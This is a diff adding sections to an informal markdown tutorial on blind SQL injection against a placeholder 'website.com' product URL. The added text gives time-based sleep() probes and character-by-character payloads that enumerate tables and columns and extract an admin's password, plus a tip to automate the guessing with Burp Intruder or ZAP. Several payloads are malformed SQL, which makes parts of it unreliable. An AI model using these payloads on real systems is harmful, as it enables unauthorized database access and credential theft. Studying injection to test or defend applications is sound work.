@@ -149,6 +149,9 @@
     1. if `or 1=0` breaks something on website or website act wiredly,
     2. now try `or 1=1`.
     3. now, if website gets back to it's normal stage, cogratulations, blind sql injection is possible. 🙂
+  - https://website.com/product/id?=23' or sleep(10) -- -
+  - https://website.com/product/id?=23' and sleep(10) -- -
+    - In this example query, if the response delayed for 10 seconds, cogratulations, blind sql injection is possible. 🙂
 
 ### 4) Exploit. (get the data from database)
 - yes, you heard it right. now, we're ready to exploit the database. no need to find total columns and vulnerable columns. 🙂
@@ -159,9 +162,9 @@
   - so, we can do like this,
     1. https://website.com/product/id?=23' and SUBSTRING(version(),1,1)=1
     2. here, `SUBSTRING(version(),1,1)=1` means, get the first letter of version.
-     3. we used, SUBSTRING(version(),***1***,1)=***1***. means, is first letter of verssion is = to 1 or not? (`we ca use <,> as well`)
+    3. we used, SUBSTRING(version(),***1***,1)=***1***. means, is first letter of version is = to 1 or not? (`we ca use <,> as well`)
     4. SUBSTRING(version(),***1***,1)=***1*** <- see, if website is normal or not (means NO ERROR).
-    5. if not, then try, 
+    5. if not, then try,
        - SUBSTRING(version(),***1***,1)=***2***,
        - SUBSTRING(version(),***1***,1)=***3***,
        - SUBSTRING(version(),***1***,1)=***4***, etc..
@@ -174,5 +177,60 @@
        - `right(left(version(),1),1)=5`
        - `(select mid(version(),8,1)=8)`
 
+- **get the tables**
+  - https://website.com/product/id?=23' and select SUBSTRING(table_name,1,1) from information_schema.tables = 'A' -- -
+    1. here, `SUBSTRING(table_name,1,1)` means, get the first letter of tabel_name.
+    2. `from information_schema.tables = 'A'` means, is first letter of table_name is = to A or not?
+    3. now try,
+       - `and select SUBSTRING(table_name,1,1) from information_schema.tables = 'B'`
+       - `and select SUBSTRING(table_name,1,1) from information_schema.tables = 'C'` etc.
+       - `and select SUBSTRING(table_name,2,1) from information_schema.tables = 'A'` <- to get the second letter of the `table_name`
+       - `and select SUBSTRING(table_name,3,1) from information_schema.tables = 'A'` <- to get the third letter of the `table_name`
+    
+    - we can guess/bruteforce the tables names as well.
+       - `and (select 'x' from user limit 1)='x' -- -` <- if FALSE, there is no table named `user`
+       - `and (select 'x' from users limit 1)='x' -- -` <- if TRUE, there is a table named `users`
+       - `and (select 1 from admin limit 0,1)=1 -- -` <- if FALSE, there is no table named `admin`
+       - `and (select 1 from administrator limit 0,1)=1 -- -` <- if TRUE, there is a table named `administrator`
+
+- **get the columns**
+  - https://website.com/product/id?=23' and select SUBSTRING(column_name,1,1) from information_schema.columns = 'A' -- -
+    1. here, `SUBSTRING(column_name,1,1)` means, get the first letter of column_name.
+    2. `from information_schema.columns = 'A'` means, is first letter of column_name is = to A or not?
+    3. now try,
+       - `and select SUBSTRING(column_name,1,1) from information_schema.columns = 'B'`
+       - `and select SUBSTRING(column_name,1,1) from information_schema.columns = 'C'` etc.
+       - `and select SUBSTRING(column_name,2,1) from information_schema.columns = 'A'` <- to get the second letter of the `column_name`
+       - `and select SUBSTRING(column_name,3,1) from information_schema.columns = 'A'` <- to get the third letter of the `column_name`
+
+    - we can guess/bruteforce the column names as well.
+       - `and (select substring(concat(1,pass),1,1) from users limit 0,1)=1 -- -` <- if FALSE, there is no column named `pass`
+       - `and (select substring(concat(1,password),1,1) from users limit 0,1)=1 -- -` <- if TRUE, there is a column named `password`
+       - `and (select substring(concat(1,username),1,1) from users limit 0,1)=1 -- -` <- if TRUE, there is a column named `username`
+
+- **get the data**
+  - we can guess/bruteforce the data.
+  - example,
+    - let's assume the columname is **username** and confirm that username **admin** is present in the **users** table.
+       - `and (select username from users where username='admin')='admin'` <- if TRUE, username `admin` is available.
+    
+    - let's assume the columname is, **password** and enumerate the columname **password** of the **admin**.
+       - `and (select username from users where username='admin' and length(password=1))='admin'` <- FALSE
+       - `and (select username from users where username='admin' and length(password=2))='admin'` <- FALSE
+       - `and (select username from users where username='admin' and length(password=3))='admin'` <- FALSE
+       - `and (select username from users where username='admin' and length(password=4))='admin'` <- FALSE
+       - `and (select username from users where username='admin' and length(password=5))='admin'` <- FALSE
+       - `and (select username from users where username='admin' and length(password=10))='admin'` <- TRUE. **password** is 10 character long.
+    
+    - now let's extract the values from  **password** using guess/bruteforce method.
+      - `and (select substring(password, 1,1) from users where username='admin')='a'` means, first character of **password** = a or not?
+      - `and (select substring(password, 1,1) from users where username='admin')='b'` means, first character of **password** = b or not?
+      - `and (select substring(password, 1,1) from users where username='admin')='c'` means, first character of **password** = c or not? etc.
+      - `and (select substring(password, 2,1) from users where username='admin')='a'` means, second character of **password** = a or not?
+      - `and (select substring(password, 2,1) from users where username='admin')='b'` means, second character of **password** = b or not?
+      - `and (select substring(password, 2,1) from users where username='admin')='c'` means, second character of **password** = c or not? etc.
+
+**Tips**
+ - we can use the BurpSuite's ***Intruder*** or OWASP ZAP's ***Fuzz*** for automating the guess/bruteforce method.
 
 **Note:** not completed. to be continued...
